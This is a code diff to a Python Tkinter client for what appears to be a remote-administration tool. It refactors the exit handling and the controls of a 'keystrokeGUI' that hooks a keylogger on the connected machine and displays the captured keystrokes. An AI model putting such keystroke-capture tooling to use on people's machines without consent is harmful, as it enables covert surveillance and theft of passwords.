@@ -163,10 +163,13 @@ class ClientGUI:
 
     def exit(self):
         if self.services != None:
-            if not askokcancel("Exit", "Client is connecting.\nDo you want to disconnect?"):
-                return
-            
-            self.services.sendCloseConection()
+            try:
+                if self.services.ping()and not askokcancel("Exit", "Client is connecting.\nDo you want to disconnect?"):
+                    return
+                
+                self.services.sendCloseConection()
+            except:
+                pass
             
         self.master.destroy()
     
@@ -642,7 +645,7 @@ class keystrokeGUI:
         windowsGlo.remove(self.master)
 
     def hook(self):
-        if self.services.keylogger_CommandHook() == 'OK':
+        if self.services.keylogger_Command('hook') == 'OK':
             self.btn_hook.config(state = 'disabled')
             self.btn_unhook.config(state = 'normal')
         else:
@@ -656,7 +659,7 @@ class keystrokeGUI:
     def print(self):
         self.text_area.config(state = 'normal')
         self.text_area.delete(1.0, END)
-        self.text_area.insert(INSERT, self.services.keylogger_Send())
+        self.text_area.insert(INSERT, self.services.keylogger_Command('send'))
         self.text_area.config(state = 'disabled')
 
     def clear(self):
